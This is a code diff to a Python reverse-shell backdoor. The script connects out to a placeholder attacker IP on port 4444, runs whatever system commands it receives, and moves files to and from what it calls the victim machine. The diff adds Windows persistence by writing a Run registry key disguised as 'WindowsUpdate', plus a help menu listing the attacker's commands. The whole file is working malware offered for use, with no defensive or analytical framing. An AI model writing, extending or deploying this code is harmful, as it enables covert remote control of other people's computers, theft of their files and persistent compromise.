@@ -3,6 +3,7 @@ import subprocess
 import os
 import time
 import threading
+import winreg
 
 ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
 PORT = 4444  # Reverse shell port
@@ -48,17 +49,51 @@ def receive_file(client, filename):
             f.write(chunk)
     client.send(f"File {filename} uploaded successfully.\n".encode())
 
+def add_persistence():
+    """Adds persistence by creating a registry entry."""
+    exe_path = os.path.abspath(__file__)  # Get full script path
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    
+    try:
+        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(reg)
+        return "[+] Persistence added successfully.\n"
+    except Exception as e:
+        return f"[-] Persistence failed: {e}\n"
+
 def connect_back():
     """Creates a reverse shell and handles commands from the attacker"""
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((ATTACKER_IP, PORT))
+
+            persistence_message = add_persistence()
+            
+
             
             while True:
                 cmd = client.recv(4096).decode().strip()
                 if cmd.lower() == "exit":
                     break
+
+
+                elif cmd.lower() == "help":
+                    help_message = """
+[+] Available Commands:
+  - help                  : Show this help menu
+  - persistence_status    : Check if persistence was added
+  - download <file>       : Download a file from victim machine
+  - upload <file>         : Upload a file to victim machine
+  - exit                  : Close the reverse shell
+  - Any system command    : Execute system commands (e.g., dir, ls, whoami)
+"""
+                    client.send(help_message.encode())
+
+                    
+                elif cmd.lower() == "persistence_status":
+                    client.send(persistence_message.encode())
                 
                 elif cmd.startswith("download "):
                     filename = cmd.split(" ", 1)[1]
@@ -85,4 +120,6 @@ def connect_back():
             time.sleep(5)  # Avoid excessive reconnection attempts
 
 if __name__ == "__main__":
+         
     connect_back()
+     
